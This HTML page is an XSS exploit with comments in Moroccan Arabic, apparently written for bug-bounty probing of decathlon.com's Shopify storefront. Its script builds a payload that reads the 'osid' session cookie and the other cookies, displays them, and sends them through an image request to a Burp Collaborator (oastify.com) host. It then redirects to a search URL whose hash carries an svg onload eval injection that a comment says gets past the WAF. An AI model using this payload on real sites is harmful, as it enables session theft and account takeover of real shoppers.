<!DOCTYPE html>
<html>
<body>
    <script>
        // الكود اللي غيضرب الـ Shopify OSID
        let payload = `
            (function(){
                // 1. قراءة الـ OSID والـ Cookies
                var osid = document.cookie.match(/osid=([^;]+)/)?.[1] || "NOT_LOGGED_IN";
                var cookies = document.cookie;
                
                // 2. الرابط الجديد ديال Burp اللي عطيتيني
                var brupUrl = "https://v3zd1js4rurl90qazq59isnlhcn3b2zr.oastify.com/?osid=" + osid;

                // 3. إظهار الداتا فـ الصفحة (Internal Proof)
                document.body.innerHTML = "<div style='background:red;color:white;padding:50px;font-size:25px;position:fixed;top:0;width:100%;z-index:9999;text-align:center;word-break:break-all;'>" +
                                          "<h1>VULNERABILITY CONFIRMED!</h1>" +
                                          "<b>OSID:</b> " + osid + "</div>";

                // 4. محاولة تهريب الداتا لـ Burp (External Proof)
                var img = new Image();
                img.src = brupUrl + "&full=" + btoa(cookies).substring(0,100);
            })();
        `;

        let encoded = encodeURIComponent(payload);
        
        // استغلال الـ Hash (#) اللي ديما كيسلكنا من الـ WAF
        let finalTarget = "https://www.decathlon.com/search?q=test#<svg/onload=eval(decodeURIComponent('" + encoded + "'))>";

        window.location.href = finalTarget;
    </script>
</body>
</html>
